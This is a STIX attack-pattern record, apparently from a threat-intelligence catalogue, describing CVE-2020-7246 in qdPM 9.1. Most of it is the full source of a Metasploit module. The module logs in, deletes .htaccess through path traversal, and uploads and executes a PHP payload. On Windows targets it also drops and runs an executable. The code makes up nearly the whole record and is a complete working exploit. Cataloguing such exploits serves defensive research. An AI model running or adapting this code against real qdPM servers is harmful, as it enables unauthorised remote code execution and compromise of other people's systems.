{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b125b24-ef52-407b-91cf-8685c262eb31",
    "created": "2024-08-14T17:11:34.605089Z",
    "modified": "2024-08-14T17:11:34.605093Z",
    "name": "qdPM 9.1 Authenticated Arbitrary PHP File Upload (RCE)",
    "description": " A remote code execution (RCE) vulnerability exists in qdPM 9.1 and earlier. An attacker can upload a malicious PHP code file via the profile photo functionality, by leveraging a path traversal vulnerability in the users['photop_preview'] delete photo feature, allowing bypass of .htaccess protection.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/qdpm_authenticated_rce.rb",
            "external_id": "qdpm_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7246"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::PhpEXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'qdPM 9.1 Authenticated Arbitrary PHP File Upload (RCE)',\n        'Description' => %q{\n          A remote code execution (RCE) vulnerability exists in qdPM 9.1 and earlier.\n          An attacker can upload a malicious PHP code file via the profile photo functionality, by leveraging a path traversal\n          vulnerability in the users['photop_preview'] delete photo feature, allowing bypass of .htaccess protection.\n          NOTE: this issue exists because of an incomplete fix for CVE-2015-3884.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Rishal Dwivedi (Loginsoft)', # Discovery\n          'Leon Trappett (thepcn3rd)', # PoC\n          'Giacomo Casoni' # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-7246'],\n          ['EDB', '50175']\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\"\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => %w[linux php],\n        'Targets' => [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],\n          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ],\n          [ 'Windows x86', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64, 'Platform' => 'win' } ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-11-21',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base directory where qdPM resides', '/']),\n        OptString.new('EMAIL', [true, 'The email to login with']),\n        OptString.new('PASSWORD', [true, 'The password to login with'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    uri = normalize_uri(uri, '/index.php')\n    res = send_request_raw({ 'uri' => uri })\n    if res.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    login_page = res.get_html_document\n    begin\n      version_num = login_page.at('div[@class=\"copyright\"]').at('a').text.tr('qdPM ', '').to_f\n    rescue StandardError\n      return Exploit::CheckCode::Unknown\n    end\n    version = Rex::Version.new(version_num)\n    if version <= Rex::Version.new('9.1')\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def get_write_exec_payload_win(fname, _data)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n    php = %|\n    <?php\n    $f = fopen(\"#{fname}\", \"wb\");\n    fwrite($f, base64_decode(\"#{p}\"));\n    fclose($f);\n    exec(\"C:\\\\Windows\\\\System32\\\\cmd.exe /c #{fname}\");\n    ?>\n    |\n    php = php.gsub(/^ {4}/, '').gsub(/\\n/, ' ')\n    return php\n  end\n\n  def login(base, username, password)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(\"#{base}/index.php/login\"),\n      'keep_cookies' => true\n    })\n    login_page = res.get_html_document\n    csrf_token = login_page.at(\"input[name='login[_csrf_token]']/@value\")\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(\"#{base}/index.php/login\"),\n      'vars_post' => {\n        'login[email]' => username,\n        'login[password]' => password,\n        'login[_csrf_token]' => csrf_token\n      },\n      'keep_cookies' => true,\n      'headers' => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}/#{base}/index.php/login\"\n      }\n    })\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(\"#{base}/index.php/myAccount\"),\n      'keep_cookies' => true,\n      'headers' => {\n        'Host' => rhost.to_s\n      }\n    })\n    account_page = res.get_html_document\n    begin\n      userid = account_page.at(\"input[@name='users[id]']/@value\").text.strip\n    rescue StandardError\n      print_error('The designated admin account does not have a user ID.')\n      return {}\n    end\n    username = account_page.at(\"input[@name='users[name]']/@value\").text.strip\n    csrftoken_ = account_page.at(\"input[@name='users[_csrf_token]']/@value\").text.strip\n    opts = {\n      'user_id' => userid,\n      'name' => username,\n      'csrf_token' => csrftoken_\n    }\n    return opts\n  end\n\n  def upload_php(base, opts)\n    fname = opts['filename']\n    php_payload = opts['data']\n    user_id = opts['user_id']\n    email = opts['email']\n    csrf_token = opts['csrf_token']\n\n    data = [\n      { 'name' => 'sf_method', 'data' => 'put' },\n      { 'name' => 'users[id]', 'data' => user_id },\n      { 'name' => 'users[photo_preview]', 'data' => '.htaccess' },\n      { 'name' => 'users[_csrf_token]', 'data' => csrf_token },\n      { 'name' => 'users[new_password]', 'data' => '' },\n      { 'name' => 'users[email]', 'data' => email },\n      { 'name' => 'extra_fields[9]', 'data' => '' },\n      { 'name' => 'users[remove_photo]', 'data' => '1' }\n    ]\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(\"#{base}/index.php/myAccount/update\"),\n      'vars_form_data' => data,\n      'keep_cookies' => true,\n      'headers' => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}#{base}/index.php/home/myAccount\"\n      }\n    )\n\n    data = [\n      { 'name' => 'sf_method', 'data' => 'put' },\n      { 'name' => 'users[id]', 'data' => user_id },\n      { 'name' => 'users[photo_preview]', 'data' => '../.htaccess' },\n      { 'name' => 'users[_csrf_token]', 'data' => csrf_token },\n      { 'name' => 'users[new_password]', 'data' => '' },\n      { 'name' => 'users[email]', 'data' => email },\n      { 'name' => 'extra_fields[9]', 'data' => '' },\n      { 'name' => 'users[remove_photo]', 'data' => '1' }\n    ]\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(\"#{base}/index.php/myAccount/update\"),\n      'vars_form_data' => data,\n      'keep_cookies' => true,\n      'headers' => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}#{base}/index.php/home/myAccount\"\n      }\n    )\n\n    data = [\n      { 'name' => 'sf_method', 'data' => 'put' },\n      { 'name' => 'users[id]', 'data' => user_id },\n      { 'name' => 'users[_csrf_token]', 'data' => csrf_token },\n      { 'name' => 'users[new_password]', 'data' => '' },\n      { 'name' => 'users[email]', 'data' => email },\n      { 'name' => 'extra_fields[9]', 'data' => '' },\n      { 'name' => 'users[remove_photo]', 'data' => '1' },\n      { 'name' => 'users[photo]', 'data' => php_payload, 'mime_type' => 'application/octet-stream', 'filename' => fname }\n    ]\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(\"#{base}/index.php/myAccount/update\"),\n      'vars_form_data' => data,\n      'keep_cookies' => true,\n      'headers' => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}#{base}/index.php/home/myAccount\"\n      }\n    })\n\n    return res.code == 302\n  end\n\n  def exec_php(base, _opts)\n    res = send_request_cgi({\n      'uri' => normalize_uri(\"#{base}/index.php/myAccount\"),\n      'keep_cookies' => true\n    })\n    home_page = res.get_html_document\n    backdoor = home_page.at(\"//input[@name='users[photo_preview]']/@value\").text.strip\n    register_file_for_cleanup(backdoor)\n    send_request_cgi({\n      'uri' => normalize_uri(\"#{base}/uploads/users/#{backdoor}\")\n    })\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    user = datastore['EMAIL']\n    pass = datastore['PASSWORD']\n    print_status(\"Attempt to login with '#{user}:#{pass}'\")\n    opts = login(uri, user, pass)\n    if opts.empty?\n      print_error('Login unsuccessful or bad (admin) user')\n      return\n    end\n\n    php_fname = \"#{Rex::Text.rand_text_alpha(5)}.php\"\n    case target['Platform']\n    when 'php'\n      p = get_write_exec_payload\n    when 'linux'\n      p = get_write_exec_payload(unlink_self: true)\n    when 'win'\n      bin_name = \"#{Rex::Text.rand_text_alpha(5)}.bin\"\n      bin = generate_payload_exe\n      p = get_write_exec_payload_win(bin_name.to_s, bin)\n      print_warning(\"#{bin_name} will require manual cleanup\")\n    end\n\n    print_status(\"Uploading PHP payload (#{p.length} bytes)...\")\n    data = {\n      'email' => user.to_s,\n      'filename' => php_fname,\n      'data' => p\n    }\n    data = data.merge(opts)\n    uploader = upload_php(uri, data)\n    if !uploader\n      print_error('Unable to upload')\n      return\n    end\n\n    print_status(\"Executing '#{php_fname}'\")\n    exec_php(uri, opts)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-11-21",
    "x_mitre_platforms": [
        "%w[linux php]"
    ]
}